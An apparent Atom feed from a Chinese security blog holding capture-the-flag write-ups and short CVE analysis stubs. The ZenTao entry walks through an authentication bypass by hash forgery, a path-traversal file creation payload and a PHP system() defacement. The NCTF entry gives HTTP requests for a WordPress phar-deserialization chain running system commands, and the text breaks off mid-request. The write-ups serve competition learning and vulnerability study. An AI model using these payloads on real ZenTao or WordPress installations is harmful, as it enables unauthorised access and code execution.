<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Drunkbaby&#39;s Blog</title>
  
  <subtitle>Hexo theme keep quick starter</subtitle>
  <link href="https://drun1baby.github.io/atom.xml" rel="self"/>
  
  <link href="https://drun1baby.github.io/"/>
  <updated>2024-02-01T13:04:38.220Z</updated>
  <id>https://drun1baby.github.io/</id>
  
  <author>
    <name>Keep Team</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2023-22527 Confluence SSTI RCE 漏洞分析</title>
    <link href="https://drun1baby.github.io/2024/01/23/CVE-2023-22527-Confluence-SSTI-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2024/01/23/CVE-2023-22527-Confluence-SSTI-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2024-01-23T11:38:27.000Z</published>
    <updated>2024-02-01T13:04:38.220Z</updated>
    
    <content type="html"><![CDATA[<p>传公众号了，博客以后应该会不怎么更新了</p>]]></content>
    
    
    <summary type="html">CVE-2023-22527 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>强网杯 s7 决赛 Zent WP</title>
    <link href="https://drun1baby.github.io/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/"/>
    <id>https://drun1baby.github.io/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/</id>
    <published>2024-01-15T01:56:07.000Z</published>
    <updated>2024-02-01T13:04:09.111Z</updated>
    
    <content type="html"><![CDATA[<p>太菜了，最后还是差一点，发现题目前台和我们想象中的不一样，后台已经 RCE 了，但是前台没过，上台直接汗流浃背了</p><h2 id="前台鉴权绕过"><a href="#前台鉴权绕过" class="headerlink" title="前台鉴权绕过"></a>前台鉴权绕过</h2><p>先来看一下题目给的 deploy</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2. 题目仅做过如下改动</span><br><span class="line"></span><br><span class="line">/opt/zbox/bin/mysql -u root -P 3306 -p123456 -e &quot;drop database zentaoep;drop database zentaomax;&quot;</span><br><span class="line">/opt/zbox/bin/mysql -u root -P 3306 -p123456 -e &quot;use zentao;update zt_user SET password=&#x27;123abc&#x27; where account =&#x27;admin&#x27;;&quot;</span><br><span class="line">rm -rf /opt/zbox/app/zentaoep &amp;&amp; rm -rf /opt/zbox/app/zentaomax &amp;&amp; rm -rf /opt/zbox/app/adminer &amp;&amp; rm -rf /opt/zbox/bin/htpasswd</span><br><span class="line"></span><br><span class="line">3.题目部署方法（展台采用同样方式部署）</span><br><span class="line"></span><br><span class="line">docker load -i zentao.tar</span><br><span class="line">docker run -dit  --name=zentao -p 30021:80  ctf2:latest</span><br><span class="line">docker exec -it zentao /opt/zbox/zbox restart</span><br></pre></td></tr></table></figure><p>但是将环境起了之后，会发现用 admin&#x2F;123abc 是没办法登录进去的</p><p>抓包之后的逻辑是在 <code>/module/user</code> 下的 control，login 方法，这里是 zentao 的路由处理。</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/identify.png" class><p>跟进一下 <code>identify()</code> 函数，看一段代码就能看到最核心的鉴权部分了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">identify</span>(<span class="params"><span class="variable">$account</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$account</span> <span class="keyword">or</span> !<span class="variable">$password</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">/* Check account rule in login.  */</span></span><br><span class="line">        <span class="keyword">if</span>(!validater::<span class="title function_ invoke__">checkAccount</span>(<span class="variable">$account</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Get the user first. If $password length is 32, don&#x27;t add the password condition.  */</span></span><br><span class="line">        <span class="variable">$record</span> = <span class="variable language_">$this</span>-&gt;dao-&gt;<span class="title function_ invoke__">select</span>(<span class="string">&#x27;*&#x27;</span>)-&gt;<span class="keyword">from</span>(TABLE_USER)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;account&#x27;</span>)-&gt;<span class="title function_ invoke__">eq</span>(<span class="variable">$account</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">beginIF</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">32</span>)-&gt;<span class="title function_ invoke__">andWhere</span>(<span class="string">&#x27;password&#x27;</span>)-&gt;<span class="title function_ invoke__">eq</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))-&gt;<span class="title function_ invoke__">fi</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">andWhere</span>(<span class="string">&#x27;deleted&#x27;</span>)-&gt;<span class="title function_ invoke__">eq</span>(<span class="number">0</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If the length of $password is 32 or 40, checking by the auth hash. */</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If the length of $password is 32 or 40, checking by the auth hash. */</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$record</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$passwordLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$passwordLength</span> &lt; <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$record</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(<span class="variable">$passwordLength</span> == <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hash</span> = <span class="variable language_">$this</span>-&gt;session-&gt;rand ? <span class="title function_ invoke__">md5</span>(<span class="variable">$record</span>-&gt;password . <span class="variable">$this</span>-&gt;session-&gt;rand) : <span class="variable">$record</span>-&gt;password;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$password</span> == <span class="variable">$hash</span> ? <span class="variable">$record</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(<span class="variable">$passwordLength</span> == <span class="number">40</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hash</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$record</span>-&gt;account . <span class="variable">$record</span>-&gt;password . <span class="variable">$record</span>-&gt;last);</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$password</span> == <span class="variable">$hash</span> ? <span class="variable">$record</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$user</span> <span class="keyword">and</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) == <span class="variable">$record</span>-&gt;password) <span class="variable">$user</span> = <span class="variable">$record</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里的判断是有问题的，按照正常的逻辑来说，密码应该是从数据库里面去取，去比对的，但是，当 <code>($passwordLength == 32)</code> 时，是让一个 hash 和密码进行比对，把这部分代码提取出来，看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$passwordLength</span> == <span class="number">32</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$hash</span> = <span class="variable language_">$this</span>-&gt;session-&gt;rand ? <span class="title function_ invoke__">md5</span>(<span class="variable">$record</span>-&gt;password . <span class="variable">$this</span>-&gt;session-&gt;rand) : <span class="variable">$record</span>-&gt;password;</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$password</span> == <span class="variable">$hash</span> ? <span class="variable">$record</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>解读一下判断逻辑：</p><p>如果 session 里面存在 rand 字段，如果存在则把 password 与 rand 进行拼接，再 md5 一下，得到 hash。<br>如果 session 里面不存在 rand 字段，则直接把 passsword 的值赋给 hash。</p><p>随后比较 password 和 hash 是否相同。</p><p><code>$record-&gt;password</code> 是我们已知的，为 123abc，目前其实只需要知道 rand 是什么，就可以<strong>伪造 hash</strong> 了，从而<strong>绕过鉴权</strong>。</p><p>抓包看一下传参</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">account=admin&amp;password=fe87780190a502d7eb5f743907918ee4&amp;passwordStrength=0&amp;referer=&amp;verifyRand=1871116681&amp;keepLogin=0&amp;captcha=</span><br></pre></td></tr></table></figure><p>其中有一个参数为 <strong>verifyRand</strong>，对应代码里面的变量是 <code>$rand</code> 看一下是怎么来的</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/rand.png" class><p>很明显，对应的函数是 refreshRandom，所以前端发起请求只需要通过 <code>user-refreshRandom.html</code> 即可，这里再跟进 updateSessionRandom 函数</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/random.png" class><p>随机数，不多讲了，赋值。</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/getRandom.png" class><p>太简单了，但凡比赛的时候看一点都能出。</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/success.png" class><p>进了之后会让我重新修改密码，重新修改密码这里也需要按照上面的步骤再来一遍，再提交密码</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/reset.png" class><h2 id="后台-RCE"><a href="#后台-RCE" class="headerlink" title="后台 RCE"></a>后台 RCE</h2><p>有点骚，一开始一直在找 patch 和 diff，没想到最新版也有这个问题</p><p>最大的问题是有一个任意文件创建的漏洞，对应接口 <code>upgrade-moveExtFiles-1.html</code></p><p>来看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveExtFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span>       = fixer::<span class="title function_ invoke__">input</span>(<span class="string">&#x27;post&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>();</span><br><span class="line">        <span class="variable">$customRoot</span> = <span class="variable language_">$this</span>-&gt;app-&gt;appRoot . <span class="string">&#x27;extension&#x27;</span> . DS . <span class="string">&#x27;custom&#x27;</span>;</span><br><span class="line">        <span class="variable">$response</span>   = <span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$data</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$dirRoot</span>  = <span class="variable">$customRoot</span> . DS . <span class="title function_ invoke__">dirname</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$fileName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$fromPath</span> = <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getModuleRoot</span>() . <span class="variable">$file</span>;</span><br><span class="line">            <span class="variable">$toPath</span>   = <span class="variable">$dirRoot</span> . DS . <span class="variable">$fileName</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dirRoot</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dirRoot</span>, <span class="number">0777</span>, <span class="literal">true</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$response</span>[<span class="string">&#x27;result&#x27;</span>]  = <span class="string">&#x27;fail&#x27;</span>;</span><br><span class="line">                    <span class="variable">$response</span>[<span class="string">&#x27;command&#x27;</span>] = <span class="string">&#x27;chmod o=rwx -R &#x27;</span>. <span class="variable language_">$this</span>-&gt;app-&gt;appRoot . <span class="string">&#x27;extension/custom&#x27;</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">copy</span>(<span class="variable">$fromPath</span>, <span class="variable">$toPath</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">replaceIncludePath</span>(<span class="variable">$toPath</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>里面存在“危险”的函数是 mkdir，其实本身这并不是一个危险函数，只是用在组合利用上面就成了危险函数。</p><p>漏洞利用也非常明确，值得一提的是本身的请求是 <code>upgrade-moveExtFiles.html</code>，由于需要传一个 version 参数，所以需要加上 -1</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/mkdir.png" class><p>这一步有什么用呢？来看后台 -&gt; 二次开发 -&gt; 编辑器</p><p>当你要修改文件的时候会遇到这个问题</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/write.png" class><p>所以这里就可以写入 ok.txt 绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">files[0]=../../../../../../../../../opt/zbox/app/zentao/www/data/ok.txt</span><br></pre></td></tr></table></figure><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/ok.png" class><p>随后就可以使用编辑器进行 shell 的写入了，首页的界面是 <code>/zentao/editor-save-L29wdC96Ym94L2FwcC96ZW50YW8vbW9kdWxlL3VzZXIvdmlldy9sb2dpbi5odG1sLnBocA-edit.html</code>，参数是 b64 过去的</p><p>直接在编辑器里面写黑页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo &quot;Hacked By Nepnep&quot; &gt; /opt/zbox/app/zentao/module/user/view/login.html.php&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即可</p><img src="/2024/01/15/%E5%BC%BA%E7%BD%91%E6%9D%AF-s7-%E5%86%B3%E8%B5%9B-Zent-WP/shell.png" class><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>难受了，不过也学到了很多</p>]]></content>
    
    
    <summary type="html">强网杯 s7 决赛 Zent WP</summary>
    
    
    
    <category term="WP" scheme="https://drun1baby.github.io/categories/WP/"/>
    
    
    <category term="WP" scheme="https://drun1baby.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析</title>
    <link href="https://drun1baby.github.io/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2024/01/05/CVE-2023-46604-Apache-ActiveMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2024-01-05T11:44:02.000Z</published>
    <updated>2024-01-20T05:23:05.865Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-46604-Apache-ActiveMQ-RCE-漏洞分析"><a href="#CVE-2023-46604-Apache-ActiveMQ-RCE-漏洞分析" class="headerlink" title="CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析"></a>CVE-2023-46604 Apache ActiveMQ RCE 漏洞分析</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近发现这个攻击面还是挺有意思的</p><p>写在公众号了，凑合着看吧，晚点再同步</p><p><a class="link" href="https://mp.weixin.qq.com/s/q3nOXUJIyFIkzkXQ7j66Dg">https://mp.weixin.qq.com/s/q3nOXUJIyFIkzkXQ7j66Dg<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2023-46604 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>2023 NCTF WP</title>
    <link href="https://drun1baby.github.io/2023/12/27/2023-NCTF-WP/"/>
    <id>https://drun1baby.github.io/2023/12/27/2023-NCTF-WP/</id>
    <published>2023-12-27T08:08:39.000Z</published>
    <updated>2023-12-27T08:10:35.663Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023-NCTF-WP"><a href="#2023-NCTF-WP" class="headerlink" title="2023 NCTF WP"></a>2023 NCTF WP</h1><h2 id="Logging"><a href="#Logging" class="headerlink" title="Logging"></a>Logging</h2><p>log4j2</p><p>和原本的区别是没有 Logger 一系列 api。但是用 Accept 头修改就可以</p><img src="/2023/12/27/2023-NCTF-WP/log4j.png" class><p>反弹 shell 拿 flag</p><img src="/2023/12/27/2023-NCTF-WP/flag1.png" class><h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2><p>很 realworld 的一道题目，出的挺好的，就是一开始的思路没想到。然后踩了很多坑。</p><p>先用 wpscan 扫，做信息收集。</p><ul><li>Wordpress 版本是 6.4.1 有 POP 链漏洞。</li><li>all-in-one-video-gallery 插件版本是 2.6.4，有任意文件读取 &amp; SSRF 的洞。</li><li>contact-form-7 这里提供了文件上传的功能。Version: 5.8.4</li><li>drag-and-drop-multiple-file-upload-contact-form-7，Version：1.3.6.2；也是文件上传的点。</li></ul><p>这里的思路是很特别的，phar + SSRF，所以说这个题目真的很 RealWorld</p><p>通过任意文件上传，这里我们可以上传一个 phar 文件，由于 phar 协议对于后缀是无所谓的，所以这里上传 jpg 就可以了。</p><p>但是要构造这个 HTTP 请求需要自己起一个环境，然后配置 drag-and-drop-multiple-file-upload-contact-form-7 插件的文件上传。这个插件最后是在文章评论里面能够上传文件，出题人把 CSS 都删掉了， 导致只能自己起环境。</p><p>最终的文件上传的 HTTP 包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-admin/admin-ajax.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>120.27.148.152:8012</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1100</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary4iNAMw9WsXYpvRh5</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.155.130:8080</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.155.130:8080/2023/12/23/hello-world/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>wordpress_ac537363824161b6f57971b554f35150=admin%7C1703488989%7CPIzRFsjUUfT48tJQYugEtBeOXowW4dq5DGTK0htmzgp%7C1613ac86565afa28de016afa707f293446d531968efbbfe134f2c39f9116fd8c; wordpress_37b73f3997d8e86a5444f5e6169e62a9=admin%7C1703507590%7CphGpVzdrXMbZ1trfyuedAn43lTl3bm6e98CkwVCGBGU%7C84448144083da56f705baf56db136311c0121a1ac9f0f942cee38c9407ebd8f5; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_ac537363824161b6f57971b554f35150=admin%7C1703488989%7CPIzRFsjUUfT48tJQYugEtBeOXowW4dq5DGTK0htmzgp%7C8bbeecd37213bac95528f20b5a6714b63984d4caf8c83e032c3e2d3e6e08c931; aiovg_rand_seed=4191310244; wp_lang=zh_CN; wordpress_logged_in_37b73f3997d8e86a5444f5e6169e62a9=admin%7C1703507590%7CphGpVzdrXMbZ1trfyuedAn43lTl3bm6e98CkwVCGBGU%7C8d30bb0f69143395c98c0e2fde270c1236a715c34584cc2ab3755c7fc3bdf982; wp-settings-1=libraryContent%3Dbrowse; wp-settings-time-1=1703334790</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;size_limit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">15555555555</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;action&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">dnd_codedropz_upload</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;type&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">click</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;security&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">a803333984</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;form_id&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">18</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_name&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">upload-file<span class="number">-393</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload-file&quot;; filename=&quot;drunkbaby1.png&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">test</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary4iNAMw9WsXYpvRh5</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>用 phar 伪协议去构造反序列化的 HTTP 请求如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/video?dl=cGhhcjovLy92YXIvd3d3L2h0bWwvd3AtY29udGVudC91cGxvYWRzL3dwX2RuZGNmN191cGxvYWRzL3dwY2Y3LWZpbGVzL2RydW5rYmFieTEucG5n&amp;a=system&amp;c=ls</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>120.27.148.152:8012</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 